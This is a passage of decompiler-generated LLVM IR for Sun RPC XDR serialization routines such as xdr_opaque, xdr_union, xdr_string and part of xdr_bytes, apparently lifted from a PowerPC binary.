  %v5_10011840 = zext i1 %v2_1001183c to i32
  store i32 %v5_10011840, i32* %stack_var_-24, align 4
  %v1_10011848 = add i32 %v3_10011838, 4
  %v2_10011848 = inttoptr i32 %v1_10011848 to i32*
  %v3_10011848 = load i32, i32* %v2_10011848, align 4
  call void @__pseudo_call(i32 %v3_10011848)
  br label %dec_label_pc_1001188c

dec_label_pc_10011858:                            ; preds = %entry
  %v1_10011858 = add i32 %v0_10011810, 4
  %v2_10011858 = inttoptr i32 %v1_10011858 to i32*
  %v3_10011858 = load i32, i32* %v2_10011858, align 4
  %v1_1001185c = inttoptr i32 %v3_10011858 to i32*
  %v2_1001185c = load i32, i32* %v1_1001185c, align 4
  call void @__pseudo_call(i32 %v2_1001185c)
  %v0_10011868 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011868 = icmp eq i32 %v0_10011868, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10011868, label %dec_label_pc_10011888, label %dec_label_pc_10011874

dec_label_pc_10011874:                            ; preds = %dec_label_pc_10011858
  %v3_10011874 = load i32, i32* %stack_var_-24, align 4
  %v2_10011878 = icmp ne i32 %v3_10011874, 0
  %v5_1001187c = zext i1 %v2_10011878 to i32
  %v1_10011880 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011880 = inttoptr i32 %v1_10011880 to i32*
  store i32 %v5_1001187c, i32* %v2_10011880, align 4
  br label %dec_label_pc_1001188c

dec_label_pc_10011888:                            ; preds = %dec_label_pc_10011828, %dec_label_pc_10011858
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001188c

dec_label_pc_1001188c:                            ; preds = %dec_label_pc_10011828, %dec_label_pc_10011874, %dec_label_pc_10011834, %dec_label_pc_10011888
  %v0_1001189c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001189c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_1001188c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10011888, { 1, 0 }
}

define i32 @xdr_enum() local_unnamed_addr {
entry:
  %v0_100118a0 = call i32 @__GI_xdr_long()
  ret i32 %v0_100118a0
}

define i32 @xdr_opaque(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100118a4 = load i32, i32* @r5, align 4
  %v3_100118a4 = icmp eq i32 %v0_100118a4, 0
  store i32 %tmp, i32* @r31, align 4
  br i1 %v3_100118a4, label %dec_label_pc_10011978, label %dec_label_pc_100118c0

dec_label_pc_100118c0:                            ; preds = %entry
  %v1_100118c0 = urem i32 %v0_100118a4, 4
  %v3_100118c0 = icmp eq i32 %v1_100118c0, 0
  %v1_100118cc = sub nsw i32 4, %v1_100118c0
  %.v1_100118cc = select i1 %v3_100118c0, i32 0, i32 %v1_100118cc
  store i32 %.v1_100118cc, i32* @r30, align 4
  %v2_100118d0 = load i32, i32* %arg1, align 4
  %v3_100118d4 = icmp eq i32 %v2_100118d0, 1
  br i1 %v3_100118d4, label %dec_label_pc_100118f0, label %dec_label_pc_100118dc

dec_label_pc_100118dc:                            ; preds = %dec_label_pc_100118c0
  %v1_100118dc = icmp eq i32 %v2_100118d0, 0
  br i1 %v1_100118dc, label %dec_label_pc_10011930, label %dec_label_pc_100118e4

dec_label_pc_100118e4:                            ; preds = %dec_label_pc_100118dc
  %v3_100118e4 = icmp eq i32 %v2_100118d0, 2
  br i1 %v3_100118e4, label %dec_label_pc_10011978, label %dec_label_pc_10011980

dec_label_pc_100118f0:                            ; preds = %dec_label_pc_100118c0
  %v1_100118f0 = add i32 %tmp, 4
  %v2_100118f0 = inttoptr i32 %v1_100118f0 to i32*
  %v3_100118f0 = load i32, i32* %v2_100118f0, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_100118f8 = add i32 %v3_100118f0, 8
  %v2_100118f8 = inttoptr i32 %v1_100118f8 to i32*
  %v3_100118f8 = load i32, i32* %v2_100118f8, align 4
  call void @__pseudo_call(i32 %v3_100118f8)
  %v3_10011904 = icmp eq i32* %arg1, null
  br i1 %v3_10011904, label %dec_label_pc_10011980, label %dec_label_pc_1001190c

dec_label_pc_1001190c:                            ; preds = %dec_label_pc_100118f0
  %v0_1001190c = load i32, i32* @r30, align 4
  %v3_1001190c = icmp eq i32 %v0_1001190c, 0
  br i1 %v3_1001190c, label %dec_label_pc_10011978, label %dec_label_pc_10011914

dec_label_pc_10011914:                            ; preds = %dec_label_pc_1001190c
  %v0_10011914 = load i32, i32* @r31, align 4
  %v1_10011914 = add i32 %v0_10011914, 4
  %v2_10011914 = inttoptr i32 %v1_10011914 to i32*
  %v3_10011914 = load i32, i32* %v2_10011914, align 4
  store i32 %v0_10011914, i32* %r3.global-to-local, align 4
  %v1_10011924 = add i32 %v3_10011914, 8
  br label %dec_label_pc_1001196c

dec_label_pc_10011930:                            ; preds = %dec_label_pc_100118dc
  %v1_10011930 = add i32 %tmp, 4
  %v2_10011930 = inttoptr i32 %v1_10011930 to i32*
  %v3_10011930 = load i32, i32* %v2_10011930, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_10011938 = add i32 %v3_10011930, 12
  %v2_10011938 = inttoptr i32 %v1_10011938 to i32*
  %v3_10011938 = load i32, i32* %v2_10011938, align 4
  call void @__pseudo_call(i32 %v3_10011938)
  %v3_10011944 = icmp eq i32* %arg1, null
  br i1 %v3_10011944, label %dec_label_pc_10011980, label %dec_label_pc_1001194c

dec_label_pc_1001194c:                            ; preds = %dec_label_pc_10011930
  %v0_1001194c = load i32, i32* @r30, align 4
  %v3_1001194c = icmp eq i32 %v0_1001194c, 0
  br i1 %v3_1001194c, label %dec_label_pc_10011978, label %dec_label_pc_10011954

dec_label_pc_10011954:                            ; preds = %dec_label_pc_1001194c
  %v0_10011954 = load i32, i32* @r31, align 4
  %v1_10011954 = add i32 %v0_10011954, 4
  %v2_10011954 = inttoptr i32 %v1_10011954 to i32*
  %v3_10011954 = load i32, i32* %v2_10011954, align 4
  store i32 %v0_10011954, i32* %r3.global-to-local, align 4
  %v1_10011964 = add i32 %v3_10011954, 12
  br label %dec_label_pc_1001196c

dec_label_pc_1001196c:                            ; preds = %dec_label_pc_10011914, %dec_label_pc_10011954
  %storemerge1.in.in = phi i32 [ %v1_10011964, %dec_label_pc_10011954 ], [ %v1_10011924, %dec_label_pc_10011914 ]
  %storemerge1.in = inttoptr i32 %storemerge1.in.in to i32*
  %storemerge1 = load i32, i32* %storemerge1.in, align 4
  call void @__pseudo_call(i32 %storemerge1)
  %v0_10011994.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011984

dec_label_pc_10011978:                            ; preds = %dec_label_pc_100118e4, %dec_label_pc_1001194c, %dec_label_pc_1001190c, %entry
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011984

dec_label_pc_10011980:                            ; preds = %dec_label_pc_100118e4, %dec_label_pc_10011930, %dec_label_pc_100118f0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011984

dec_label_pc_10011984:                            ; preds = %dec_label_pc_10011978, %dec_label_pc_1001196c, %dec_label_pc_10011980
  %v0_10011994 = phi i32 [ 1, %dec_label_pc_10011978 ], [ %v0_10011994.pre, %dec_label_pc_1001196c ], [ 0, %dec_label_pc_10011980 ]
  ret i32 %v0_10011994

; uselistorder directives
  uselistorder i32 %v1_100118c0, { 1, 0 }
  uselistorder i32 %tmp, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 5, 3, 4, 6, 7, 0 }
  uselistorder i32* null, { 1, 0, 4, 3, 2, 5, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10011984, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011980, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011978, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1001196c, { 1, 0 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg4, i32* @r31, align 4
  store i32 %arg5, i32* %r28.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268507584, i32* @lr, align 4
  %v0_100119bc = call i32 @xdr_enum()
  %v3_100119c0 = icmp eq i32 %v0_100119bc, 0
  br i1 %v3_100119c0, label %dec_label_pc_10011a24, label %dec_label_pc_100119c8

dec_label_pc_100119c8:                            ; preds = %entry
  %v0_100119c8 = load i32, i32* @r30, align 4
  %v1_100119c8 = inttoptr i32 %v0_100119c8 to i32*
  %v2_100119c8 = load i32, i32* %v1_100119c8, align 4
  %v0_100119e0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100119e0

dec_label_pc_100119d0:                            ; preds = %dec_label_pc_100119e0
  %v1_100119d0 = inttoptr i32 %v0_100119d0 to i32*
  %v2_100119d0 = load i32, i32* %v1_100119d0, align 4
  %v1_100119d4 = add i32 %v0_100119d0, 8
  %v4_100119d8 = icmp eq i32 %v2_100119d0, %v2_100119c8
  br i1 %v4_100119d8, label %dec_label_pc_10011a18.loopexit, label %dec_label_pc_100119e0

dec_label_pc_100119e0:                            ; preds = %dec_label_pc_100119d0, %dec_label_pc_100119c8
  %v0_100119d0 = phi i32 [ %v1_100119d4, %dec_label_pc_100119d0 ], [ %v0_100119e0.pre, %dec_label_pc_100119c8 ]
  %v1_100119e0 = add i32 %v0_100119d0, 4
  %v2_100119e0 = inttoptr i32 %v1_100119e0 to i32*
  %v3_100119e0 = load i32, i32* %v2_100119e0, align 4
  %v3_100119e4 = icmp eq i32 %v3_100119e0, 0
  br i1 %v3_100119e4, label %dec_label_pc_100119ec, label %dec_label_pc_100119d0

dec_label_pc_100119ec:                            ; preds = %dec_label_pc_100119e0
  %v0_100119ec = load i32, i32* %r28.global-to-local, align 4
  %v3_100119ec = icmp eq i32 %v0_100119ec, 0
  br i1 %v3_100119ec, label %dec_label_pc_10011a24, label %dec_label_pc_10011a18

dec_label_pc_10011a18.loopexit:                   ; preds = %dec_label_pc_100119d0
  br label %dec_label_pc_10011a18

dec_label_pc_10011a18:                            ; preds = %dec_label_pc_10011a18.loopexit, %dec_label_pc_100119ec
  %storemerge2 = phi i32 [ %v0_100119ec, %dec_label_pc_100119ec ], [ %v3_100119e0, %dec_label_pc_10011a18.loopexit ]
  %storemerge1 = load i32, i32* %r29.global-to-local, align 4
  call void @__pseudo_call(i32 %storemerge2)
  br label %dec_label_pc_10011a28

dec_label_pc_10011a24:                            ; preds = %dec_label_pc_100119ec, %entry
  br label %dec_label_pc_10011a28

dec_label_pc_10011a28:                            ; preds = %dec_label_pc_10011a18, %dec_label_pc_10011a24
  %v0_10011a38 = phi i32 [ %storemerge1, %dec_label_pc_10011a18 ], [ 0, %dec_label_pc_10011a24 ]
  ret i32 %v0_10011a38

; uselistorder directives
  uselistorder i32 %v0_100119d0, { 2, 0, 1 }
  uselistorder i32 ()* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder label %dec_label_pc_10011a28, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v0_10011a50 = load i32, i32* @r4, align 4
  store i32 %v0_10011a50, i32* @r29, align 4
  %v0_10011a54 = load i32, i32* @r5, align 4
  store i32 %v0_10011a54, i32* @r28, align 4
  %v2_10011a58 = load i32, i32* %arg1, align 4
  %v1_10011a5c = inttoptr i32 %v0_10011a50 to i32*
  %v2_10011a5c = load i32, i32* %v1_10011a5c, align 4
  store i32 %v2_10011a5c, i32* @r31, align 4
  %v3_10011a60 = icmp eq i32 %v2_10011a58, 0
  br i1 %v3_10011a60, label %dec_label_pc_10011a78, label %dec_label_pc_10011a68

dec_label_pc_10011a68:                            ; preds = %entry
  %v3_10011a68 = icmp eq i32 %v2_10011a58, 2
  br i1 %v3_10011a68, label %dec_label_pc_10011a70, label %dec_label_pc_10011a8c

dec_label_pc_10011a70:                            ; preds = %dec_label_pc_10011a68
  %v3_10011a70 = icmp eq i32 %v2_10011a5c, 0
  br i1 %v3_10011a70, label %dec_label_pc_10011b40, label %dec_label_pc_10011a78.thread

dec_label_pc_10011a78.thread:                     ; preds = %dec_label_pc_10011a70
  br label %dec_label_pc_10011a80

dec_label_pc_10011a78:                            ; preds = %entry
  %v3_10011a78 = icmp eq i32 %v2_10011a5c, 0
  br i1 %v3_10011a78, label %dec_label_pc_10011b48, label %dec_label_pc_10011a80

dec_label_pc_10011a80:                            ; preds = %dec_label_pc_10011a78.thread, %dec_label_pc_10011a78
  store i32 %v2_10011a5c, i32* @r3, align 4
  %v0_10011a84 = call i32 @__GI_strlen()
  store i32 %v0_10011a84, i32* %r3.global-to-local, align 4
  store i32 %v0_10011a84, i32* %stack_var_-40, align 4
  %v0_10011a8c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10011a8c

dec_label_pc_10011a8c:                            ; preds = %dec_label_pc_10011a68, %dec_label_pc_10011a80
  %v0_10011a8c = phi i32 [ %tmp, %dec_label_pc_10011a68 ], [ %v0_10011a8c.pre, %dec_label_pc_10011a80 ]
  store i32 %v0_10011a8c, i32* @r3, align 4
  %v2_10011a90 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10011a90, i32* @r4, align 4
  store i32 268507800, i32* @lr, align 4
  %v2_10011a94 = inttoptr i32 %v0_10011a8c to i32*
  %v4_10011a94 = call i32 @xdr_u_int(i32* %v2_10011a94, i32* nonnull %stack_var_-40)
  store i32 %v4_10011a94, i32* %r3.global-to-local, align 4
  %v3_10011a98 = icmp eq i32 %v4_10011a94, 0
  br i1 %v3_10011a98, label %dec_label_pc_10011b48, label %dec_label_pc_10011aa0

dec_label_pc_10011aa0:                            ; preds = %dec_label_pc_10011a8c
  %v3_10011aa0 = load i32, i32* %stack_var_-40, align 4
  %v1_10011aa4 = load i32, i32* @r28, align 4
  %v3_10011aa4 = icmp ugt i32 %v3_10011aa0, %v1_10011aa4
  br i1 %v3_10011aa4, label %dec_label_pc_10011b48, label %dec_label_pc_10011aac

dec_label_pc_10011aac:                            ; preds = %dec_label_pc_10011aa0
  %v0_10011aac = load i32, i32* @r30, align 4
  %v1_10011aac = inttoptr i32 %v0_10011aac to i32*
  %v2_10011aac = load i32, i32* %v1_10011aac, align 4
  %v3_10011ab0 = icmp eq i32 %v2_10011aac, 1
  br i1 %v3_10011ab0, label %dec_label_pc_10011acc, label %dec_label_pc_10011ab8

dec_label_pc_10011ab8:                            ; preds = %dec_label_pc_10011aac
  %v1_10011ab8 = icmp eq i32 %v2_10011aac, 0
  br i1 %v1_10011ab8, label %dec_label_pc_10011b14, label %dec_label_pc_10011ac0

dec_label_pc_10011ac0:                            ; preds = %dec_label_pc_10011ab8
  %v3_10011ac0 = icmp eq i32 %v2_10011aac, 2
  br i1 %v3_10011ac0, label %dec_label_pc_10011b28, label %dec_label_pc_10011b48

dec_label_pc_10011acc:                            ; preds = %dec_label_pc_10011aac
  %v1_10011acc = add i32 %v3_10011aa0, 1
  store i32 %v1_10011acc, i32* @r3, align 4
  %v4_10011acc = icmp eq i32 %v1_10011acc, 0
  br i1 %v4_10011acc, label %dec_label_pc_10011b40, label %dec_label_pc_10011ad4

dec_label_pc_10011ad4:                            ; preds = %dec_label_pc_10011acc
  %v0_10011ad4 = load i32, i32* @r31, align 4
  %v3_10011ad4 = icmp eq i32 %v0_10011ad4, 0
  br i1 %v3_10011ad4, label %dec_label_pc_10011ae8, label %dec_label_pc_10011ae8.thread

dec_label_pc_10011ae8.thread:                     ; preds = %dec_label_pc_10011ad4
  br label %dec_label_pc_10011b08

dec_label_pc_10011ae8:                            ; preds = %dec_label_pc_10011ad4
  store i32 268507872, i32* @lr, align 4
  %v0_10011adc = call i32 @malloc()
  store i32 %v0_10011adc, i32* %r3.global-to-local, align 4
  %v1_10011ae0 = load i32, i32* @r29, align 4
  %v2_10011ae0 = inttoptr i32 %v1_10011ae0 to i32*
  store i32 %v0_10011adc, i32* %v2_10011ae0, align 4
  store i32 %v0_10011adc, i32* @r31, align 4
  %v3_10011ae8 = icmp eq i32 %v0_10011adc, 0
  br i1 %v3_10011ae8, label %dec_label_pc_10011af0, label %dec_label_pc_10011ae8.dec_label_pc_10011b08_crit_edge

dec_label_pc_10011ae8.dec_label_pc_10011b08_crit_edge: ; preds = %dec_label_pc_10011ae8
  %v3_10011b08.pre = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10011b08

dec_label_pc_10011af0:                            ; preds = %dec_label_pc_10011ae8
  %v3_10011af8 = load i32, i32* @global_var_1002c2b0, align 4
  store i32 ptrtoint ([27 x i8]* @global_var_100173ac.428 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10011b04.429 to i32), i32* @lr, align 4
  %v3_10011b00 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_100173ac.428 to i32), i32 %v3_10011af8)
  store i32 %v3_10011b00, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011b48

dec_label_pc_10011b08:                            ; preds = %dec_label_pc_10011ae8.dec_label_pc_10011b08_crit_edge, %dec_label_pc_10011ae8.thread
  %v3_10011b08 = phi i32 [ %v3_10011aa0, %dec_label_pc_10011ae8.thread ], [ %v3_10011b08.pre, %dec_label_pc_10011ae8.dec_label_pc_10011b08_crit_edge ]
  %v1_10011b1011 = phi i32 [ %v0_10011ad4, %dec_label_pc_10011ae8.thread ], [ %v0_10011adc, %dec_label_pc_10011ae8.dec_label_pc_10011b08_crit_edge ]
  %v4_10011b10 = add i32 %v3_10011b08, %v1_10011b1011
  %v5_10011b10 = inttoptr i32 %v4_10011b10 to i8*
  store i8 0, i8* %v5_10011b10, align 1
  %v3_10011b14.pre = load i32, i32* %stack_var_-40, align 4
  %v0_10011b18.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10011b14

dec_label_pc_10011b14:                            ; preds = %dec_label_pc_10011ab8, %dec_label_pc_10011b08
  %v0_10011b18 = phi i32 [ %v0_10011aac, %dec_label_pc_10011ab8 ], [ %v0_10011b18.pre, %dec_label_pc_10011b08 ]
  %v3_10011b14 = phi i32 [ %v3_10011aa0, %dec_label_pc_10011ab8 ], [ %v3_10011b14.pre, %dec_label_pc_10011b08 ]
  store i32 %v3_10011b14, i32* @r5, align 4
  store i32 %v0_10011b18, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10011b24.430 to i32), i32* @lr, align 4
  %v3_10011b20 = inttoptr i32 %v0_10011b18 to i32*
  %v4_10011b20 = call i32 @xdr_opaque(i32* %v3_10011b20)
  store i32 %v4_10011b20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011b4c

dec_label_pc_10011b28:                            ; preds = %dec_label_pc_10011ac0
  %v0_10011b28 = load i32, i32* @r31, align 4
  store i32 %v0_10011b28, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10011b30.431 to i32), i32* @lr, align 4
  %v0_10011b2c = call i32 @free()
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10011b38 = load i32, i32* @r29, align 4
  %v2_10011b38 = inttoptr i32 %v1_10011b38 to i32*
  store i32 0, i32* %v2_10011b38, align 4
  %v0_10011b5c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011b4c

dec_label_pc_10011b40:                            ; preds = %dec_label_pc_10011acc, %dec_label_pc_10011a70
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011b4c

dec_label_pc_10011b48:                            ; preds = %dec_label_pc_10011ac0, %dec_label_pc_10011aa0, %dec_label_pc_10011a8c, %dec_label_pc_10011a78, %dec_label_pc_10011af0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011b4c

dec_label_pc_10011b4c:                            ; preds = %dec_label_pc_10011b40, %dec_label_pc_10011b28, %dec_label_pc_10011b14, %dec_label_pc_10011b48
  %v0_10011b5c = phi i32 [ 1, %dec_label_pc_10011b40 ], [ %v0_10011b5c.pre, %dec_label_pc_10011b28 ], [ %v4_10011b20, %dec_label_pc_10011b14 ], [ 0, %dec_label_pc_10011b48 ]
  ret i32 %v0_10011b5c

; uselistorder directives
  uselistorder i32 %v0_10011b18, { 1, 0 }
  uselistorder i32 %v0_10011adc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_10011aa0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10011a8c, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder label %dec_label_pc_10011b4c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10011b48, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10011b14, { 1, 0 }
  uselistorder label %dec_label_pc_10011a8c, { 1, 0 }
  uselistorder label %dec_label_pc_10011a80, { 1, 0 }
}

define i32 @xdr_wrapstring() local_unnamed_addr {
entry:
  store i32 -1, i32* @r5, align 4
  store i32 268508020, i32* @lr, align 4
  %v2_10011b70 = call i32 @__GI_xdr_string(i32* inttoptr (i32 -1 to i32*))
  %v2_10011b74 = icmp ne i32 %v2_10011b70, 0
  %v5_10011b78 = zext i1 %v2_10011b74 to i32
  ret i32 %v5_10011b78
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10011b90 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  %v1_10011bb4 = inttoptr i32 %arg2 to i32*
  %v2_10011bb4 = load i32, i32* %v1_10011bb4, align 4
  store i32 %v2_10011bb4, i32* @r31, align 4
  store i32 268508092, i32* @lr, align 4
  %v2_10011bb8 = inttoptr i32 %arg3 to i32*
  %v4_10011bb8 = call i32 @xdr_u_int(i32* %v2_10011bb8, i32* %v2_10011bb8)
  store i32 %v4_10011bb8, i32* %r3.global-to-local, align 4
  %v3_10011bbc = icmp eq i32 %v4_10011bb8, 0
  br i1 %v3_10011bbc, label %dec_label_pc_10011c7c, label %dec_label_pc_10011bc4

dec_label_pc_10011bc4:                            ; preds = %entry
  %v0_10011bc4 = load i32, i32* @r30, align 4
  %v1_10011bc4 = inttoptr i32 %v0_10011bc4 to i32*
  %v2_10011bc4 = load i32, i32* %v1_10011bc4, align 4
  store i32 %v2_10011bc4, i32* @r30, align 4
  %v1_10011bc8 = load i32, i32* %r28.global-to-local, align 4
  %v3_10011bc8 = icmp ugt i32 %v2_10011bc4, %v1_10011bc8
  %v0_10011bd0 = load i32, i32* @r29, align 4
  %v1_10011bd0 = inttoptr i32 %v0_10011bd0 to i32*
  br i1 %v3_10011bc8, label %dec_label_pc_10011bd0, label %dec_label_pc_10011bdc

dec_label_pc_10011bd0:                            ; preds = %dec_label_pc_10011bc4
  %v2_10011bd0 = load i32, i32* %v1_10011bd0, align 4
  %v3_10011bd4 = icmp eq i32 %v2_10011bd0, 2
  br i1 %v3_10011bd4, label %dec_label_pc_10011bdc, label %dec_label_pc_10011c7c

dec_label_pc_10011bdc:                            ; preds = %dec_label_pc_10011bc4, %dec_label_pc_10011bd0
  %v2_10011bdc = load i32, i32* %v1_10011bd0, align 4
  %v3_10011be0 = icmp eq i32 %v2_10011bdc, 1
  br i1 %v3_10011be0, label %dec_label_pc_10011bfc, label %dec_label_pc_10011be8

dec_label_pc_10011be8:                            ; preds = %dec_label_pc_10011bdc
  %v1_10011be8 = icmp eq i32 %v2_10011bdc, 0
  br i1 %v1_10011be8, label %dec_label_pc_10011be8.dec_label_pc_10011c3c_crit_edge, label %dec_label_pc_10011bf0

dec_label_pc_10011be8.dec_label_pc_10011c3c_crit_edge: ; preds = %dec_label_pc_10011be8
  br label %dec_label_pc_10011c3c

dec_label_pc_10011bf0:                            ; preds = %dec_label_pc_10011be8
  %v3_10011bf0 = icmp eq i32 %v2_10011bdc, 2
  br i1 %v3_10011bf0, label %dec_label_pc_10011c5c, label %dec_label_pc_10011c7c

dec_label_pc_10011bfc:                            ; preds = %dec_label_pc_10011bdc
  %v3_10011bfc = icmp eq i32 %v2_10011bc4, 0
  br i1 %v3_10011bfc, label %dec_label_pc_10011c84, label %dec_label_pc_10011c04

dec_label_pc_10011c04:                            ; preds = %dec_label_pc_10011bfc
  %v0_10011c04 = load i32, i32* @r31, align 4
  %v3_10011c04 = icmp eq i32 %v0_10011c04, 0
  br i1 %v3_10011c04, label %dec_label_pc_10011c1c, label %dec_label_pc_10011c1c.thread

dec_label_pc_10011c1c.thread:                     ; preds = %dec_label_pc_10011c04
  br label %dec_label_pc_10011c3c

dec_label_pc_10011c1c:                            ; preds = %dec_label_pc_10011c04
  store i32 %v2_10011bc4, i32* @r3, align 4
  store i32 268508180, i32* @lr, align 4
  %v0_10011c10 = call i32 @malloc()
  store i32 %v0_10011c10, i32* %r3.global-to-local, align 4
  %v1_10011c14 = load i32, i32* @r27, align 4
  %v2_10011c14 = inttoptr i32 %v1_10011c14 to i32*
  store i32 %v0_10011c10, i32* %v2_10011c14, align 4
  %v3_10011c1c = icmp eq i32 %v0_10011c10, 0
  br i1 %v3_10011c1c, label %dec_label_pc_10011c24, label %dec_label_pc_10011c1c.dec_label_pc_10011c1c.dec_label_pc_10011c3c_crit_edge_crit_edge

dec_label_pc_10011c1c.dec_label_pc_10011c1c.dec_label_pc_10011c3c_crit_edge_crit_edge: ; preds = %dec_label_pc_10011c1c
  %v0_10011c40.pre.pre = load i32, i32* @r29, align 4
  %v0_10011c48.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10011c3c

dec_label_pc_10011c24:                            ; preds = %dec_label_pc_10011c1c
  %v3_10011c2c = load i32, i32* @global_var_1002c2b0, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_100173c8.432 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10011c38.433 to i32), i32* @lr, align 4
  %v3_10011c34 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_100173c8.432 to i32), i32 %v3_10011c2c)
  store i32 %v3_10011c34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011c7c

dec_label_pc_10011c3c:                            ; preds = %dec_label_pc_10011c1c.thread, %dec_label_pc_10011c1c.dec_label_pc_10011c1c.dec_label_pc_10011c3c_crit_edge_crit_edge, %dec_label_pc_10011be8.dec_label_pc_10011c3c_crit_edge
  %v0_10011c48 = phi i32 [ %v2_10011bc4, %dec_label_pc_10011be8.dec_label_pc_10011c3c_crit_edge ], [ %v2_10011bc4, %dec_label_pc_10011c1c.thread ], [ %v0_10011c48.pre.pre, %dec_label_pc_10011c1c.dec_label_pc_10011c1c.dec_label_pc_10011c3c_crit_edge_crit_edge ]
  %v0_10011c40 = phi i32 [ %v0_10011bd0, %dec_label_pc_10011be8.dec_label_pc_10011c3c_crit_edge ], [ %v0_10011bd0, %dec_label_pc_10011c1c.thread ], [ %v0_10011c40.pre.pre, %dec_label_pc_10011c1c.dec_label_pc_10011c1c.dec_label_pc_10011c3c_crit_edge_crit_edge ]
  store i32 %v0_10011c40, i32* %r3.global-to-local, align 4
  store i32 %v0_10011c48, i32* @r5, align 4
  store i32 %v0_10011b90, i32* @lr, align 4
  %v3_10011c58 = inttoptr i32 %v0_10011c40 to i32*
  %v4_10011c58 = call i32 @xdr_opaque(i32* %v3_10011c58)
  store i32 %v4_10011c58, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011c5c

dec_label_pc_10011c5c:                            ; preds = %dec_label_pc_10011bf0, %dec_label_pc_10011c3c
  %v0_10011c5c = load i32, i32* @r31, align 4
  %v3_10011c5c = icmp eq i32 %v0_10011c5c, 0
  br i1 %v3_10011c5c, label %dec_label_pc_10011c84, label %dec_label_pc_10011c64

dec_label_pc_10011c64:                            ; preds = %dec_label_pc_10011c5c
  store i32 %v0_10011c5c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10011c6c.434 to i32), i32* @lr, align 4
  %v0_10011c68 = call i32 @free()
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10011c74 = load i32, i32* @r27, align 4
  %v2_10011c74 = inttoptr i32 %v1_10011c74 to i32*
  store i32 0, i32* %v2_10011c74, align 4
  %v0_10011c98.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011c88

dec_label_pc_10011c7c:                            ; preds = %dec_label_pc_10011bf0, %dec_label_pc_10011bd0, %entry, %dec_label_pc_10011c24
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011c88

